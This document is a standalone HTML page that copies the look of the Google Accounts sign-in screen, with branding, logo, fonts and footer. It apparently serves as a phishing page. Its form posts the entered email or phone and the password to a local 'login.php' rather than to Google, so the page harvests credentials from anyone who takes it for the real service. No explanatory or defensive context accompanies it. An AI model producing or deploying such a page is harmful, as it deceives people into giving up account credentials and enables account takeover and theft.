<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        .login-card {
            background: #fff;
            border-radius: 8px;
            border: 1px solid #dadce0;
            padding: 48px 40px 36px;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .google-logo svg { height: 24px; }
        .sign-in-title {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
        }
        .sign-in-subtitle {
            text-align: center;
            font-size: 16px;
            color: #202124;
            margin-bottom: 32px;
            font-weight: 400;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }
        .input-wrapper {
            position: relative;
            width: 100%;
        }
        .form-input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            color: #202124;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
        }
        .form-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }
        .form-input:focus + .input-label,
        .form-input:not(:placeholder-shown) + .input-label {
            top: -8px;
            left: 12px;
            font-size: 12px;
            color: #1a73e8;
            background: #fff;
            padding: 0 4px;
        }
        .input-label {
            position: absolute;
            left: 16px;
            top: 14px;
            font-size: 16px;
            color: #5f6368;
            pointer-events: none;
            transition: all 0.15s ease;
        }
        .forgot-link {
            display: inline-block;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .forgot-link:hover { text-decoration: underline; }
        .info-text {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 8px;
        }
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .info-text a:hover { text-decoration: underline; }
        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
        }
        .btn-create {
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 8px 0;
        }
        .btn-create:hover { background: #f6fafe; border-radius: 4px; padding: 8px 8px; margin: 0 -8px; }
        .btn-next {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s, box-shadow 0.2s;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
        }
        .btn-next:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            padding: 16px 0;
            max-width: 450px;
            width: 100%;
        }
        .footer-links select {
            background: transparent;
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }
        .footer-right {
            display: flex;
            gap: 16px;
        }
        .footer-right a {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }
        .footer-right a:hover { text-decoration: underline; }
        @media (max-width: 480px) {
            .login-card {
                border: none;
                box-shadow: none;
                padding: 24px 20px;
            }
            .login-container { padding: 16px; }
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="login-card">
        <div class="google-logo">
            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 19V5.3h2.6v13.7H0zm4.7-8.2c0-1.3.5-2.5 1.4-3.4.9-.9 2.1-1.4 3.4-1.4 1.2 0 2.3.4 3.1 1.2l-1.3 1.2c-.5-.5-1.1-.7-1.8-.7-.7 0-1.4.3-1.9.8-.5.5-.8 1.3-.8 2.1v.2c0 .9.3 1.6.8 2.1.5.6 1.2.8 1.9.8.8 0 1.5-.3 2-.9l1.3 1.2c-.9.9-2 1.4-3.3 1.4-1.3 0-2.5-.5-3.4-1.4-.9-.9-1.4-2.1-1.4-3.4v-.2z" fill="#5f6368"/>
                <text x="0" y="19" font-family="'Google Sans', 'Product Sans', 'Roboto', Arial, sans-serif" font-size="22" font-weight="500">
                    <tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
                </text>
            </svg>
        </div>
        <h1 class="sign-in-title">Sign in</h1>
        <p class="sign-in-subtitle">Use your Google Account</p>
        <form class="login-form" action="login.php" method="POST" autocomplete="off">
            <div class="input-wrapper">
                <input type="text" name="username" class="form-input" placeholder=" " required id="email">
                <label class="input-label" for="email">Email or phone</label>
            </div>
            <div class="input-wrapper">
                <input type="password" name="password" class="form-input" placeholder=" " required id="password">
                <label class="input-label" for="password">Enter your password</label>
            </div>
            <a class="forgot-link" href="#">Forgot email?</a>
            <p class="info-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
            <div class="form-actions">
                <button type="button" class="btn-create">Create account</button>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>
    <div class="footer-links">
        <select>
            <option>English (United Kingdom)</option>
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
            <option>日本語</option>
            <option>한국어</option>
            <option>中文</option>
            <option>العربية</option>
            <option>हिन्दी</option>
        </select>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</div>
</body>
</html>
